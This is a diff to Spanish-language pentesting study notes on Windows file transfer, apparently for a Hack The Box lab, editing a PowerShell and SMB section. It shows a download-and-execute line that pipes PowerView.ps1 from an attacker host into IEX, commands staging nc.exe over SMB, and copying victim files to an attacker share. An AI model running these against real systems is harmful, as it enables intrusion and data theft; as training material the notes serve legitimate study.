@@ -64,7 +64,7 @@ PowerShell tiene varios métodos para aprovechar la descarga de estos contenidos
 | **DownloadFileAsync**   | Descarga los datos y los guarda en un archivo local **sin bloquear**.        | Asíncrono  |
 | **DownloadString**      | Descarga los datos de un recurso y los devuelve como **string** de texto.    | Síncrono   |
 | **DownloadStringAsync** | Descarga los datos como string **sin bloquear** el hilo que llama.           | Asíncrono  |
-*
+
 - **Síncrono** → el comando espera a que termine la descarga antes de continuar.
 - **Asíncrono** → la descarga ocurre en segundo plano, permitiendo que el script siga ejecutándose.
 
@@ -190,34 +190,50 @@ PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
     Protocolo de red en Windows (TCP/445) para transferir archivos entre máquinas.
 - **Montar un servidor SMB desde la máquina atacante:**
 ```
-sudo impacket-smbserver share -smb2support /tmp/smbshare`
+sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
 
 - **Copiar un archivo desde SMB (sin autenticación):**
 ```
-copy \\<Pwnbox-IP>\share\nc.exe`
+copy \\<Pwnbox-IP>\share\nc.exe
 ```
 Este comando descarga en el directorio actual de trabajo tal archivo.
 > Nota: Nuevas versiones de Windows bloquean acceso de invitados no autenticados.
 
-- **Montar SMB con usuario y contraseña (desde máquina atacante):**
+
+
+# **\[IMPORTANTÍSIMO]**
+## **Montar SMB con usuario y contraseña (desde máquina atacante):**
 ```
-sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
+
+Me aseguro que la carpeta /tmp/smbshare se haya creado, de lo contrario, ejecuto:
+```
+sudo mkdir -p /tmp/smbshare
+sudo chmod 777 /tmp/smbshare
+ls -ld /tmp/smbshare
+``````
+
 - **Conectar al SMB desde Windows:**
 ```
-net use n: \\<Pwnbox-IP>\share /user:test test copy n:\nc.exe`
+net use N: \\<Pwnbox-IP>\share /user:test test 
+copy C:\ruta_del_archivo N:\
 ```
 
 - **Notas importantes:**
-    
     - Permite transferir archivos incluso si el firewall bloquea FTP o HTTP.
-        
     - Útil para escenarios de laboratorio o pruebas de pentesting.
-        
     - Montar la unidad (net use) ayuda a evitar errores de acceso directo.
 
+En Linux, acudir a la carpeta siguiente para visualizar los archivos:
+```
+cd /tmp/smbshare
+```
+
 --------------
+
+
 
 # FTP Downloads
 Protocolo de transferencia de archivos que usa **TCP/21** (comandos) y **TCP/20** (datos).
